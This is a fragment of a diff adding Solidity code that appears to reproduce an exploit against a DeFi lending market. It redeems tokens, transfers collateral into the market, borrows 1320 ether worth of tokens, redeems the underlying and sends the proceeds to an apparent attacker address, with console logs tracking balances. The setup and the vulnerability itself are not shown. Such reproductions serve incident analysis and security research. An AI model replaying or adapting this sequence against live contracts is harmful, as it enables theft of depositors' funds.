+        console2.log("I(xf514).balanceOf(r)\t\t->", uint256(16499999999999));
+        I(xf514).redeem(16499999999997);
+        // uint256 v3 = 3299999999999599999999;
+        uint256 v3 = I(xf573).balanceOf(r);
+        console2.log("I(xf573).balanceOf(r)\t\t->", "3299999999999599999999 (3299.9999 ether)");
+        I(xf573).transfer(xf514, v3);
+        // uint256 v4 = 10167514103416337088118;
+        uint256 v4 = I(x6b17).balanceOf(xe5c6);
+        console2.log("I(x6b17).balanceOf(xe5c6)\t->", "10167514103416337088118 (10167.5141 ether)");
+        I(xe5c6).borrow(1320000000000000000000);
+        I(xf514).redeemUnderlying(v1);
+        I(x6b17).transfer(xa6d3, 1320000000000000000000);
+        I(xf573).transfer(xa6d3, v1);
+    }
+
+    fallback() external payable {
+        revert("no such function");
+    }
+}
